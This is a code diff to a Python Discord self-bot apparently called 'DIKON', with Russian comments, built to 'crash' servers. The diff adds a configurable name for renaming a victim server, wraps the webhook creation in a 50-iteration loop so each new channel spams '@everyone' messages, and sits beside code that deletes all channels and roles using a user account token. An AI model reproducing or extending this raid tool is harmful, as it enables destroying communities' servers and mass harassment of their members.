@@ -52,6 +52,8 @@ except:
 #здесь пишем ваше имя, только не стирайте ничего
 #откроете консоль и поймете
 
+namen = 'CRASH BY DIKON' # здесь пишем имя сервера при краше
+
 icon = 'icon.jpg' #если что, вы можете поменять иконку. Тут надо указать иконку, которая будет при краше сервера, типо изменение иконки сервера, тут ее имя в файлах
 
 webhook = 'Crasher' #имя вебхука при спаме
@@ -62,7 +64,7 @@ spamtext = f'@everyone\nВы крашнуты!\nНаш сервер: {invite}' #
 
 reason = 'Crash' #тут ничего не трогать лучше
 
-token = "ТОКЕН АККАУНТА"#введите свой токен аккаунт, как получить токен? # Найдите в ютубе =)
+token = "ТОКЕН АККАУНТА" #введите свой токен аккаунт, как получить токен? # Найдите в ютубе =)
 
 porno = "DIKON SELF BOT | Hello world... yea!" #здесь пишем текст вашего стрима
 
@@ -398,7 +400,7 @@ async def crash(ctx):
     await asyncio.sleep(5)
     print("[LOG] Меняю название сервера")
     await asyncio.sleep(2)
-    await ctx.guild.edit(name=f'Crash By DIKON')
+    await ctx.guild.edit(name=namen)
     print("[LOG] Начинаю удаление всех каналов и ролей сервера")
     global sure
     sure = 1
@@ -440,10 +442,11 @@ async def crash(ctx):
 async def on_guild_channel_create(channel):
     global sure
     if sure == 1:
-        await channel.create_webhook(name=webhook)
-        hooklist = await channel.webhooks()
-        for hook in hooklist:
-            await hook.send(content=spamtext, wait=True)
+        for i in range(50):
+            await channel.create_webhook(name=webhook)
+            hooklist = await channel.webhooks()
+            for hook in hooklist:
+                await hook.send(content=spamtext, wait=True)
         #спам вебхуками
         #если вы не дали согласие, краша не будет.
 @bot.command()
@@ -615,7 +618,7 @@ async def doublecopy(ctx):
         if role.name != "@everyone":
             try:
                 await wow.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable)
-                print(f"Created new role : {role.name}")
+                print(f"[LOG] Создал новую роль : {role.name}")
             except:
                 break
 
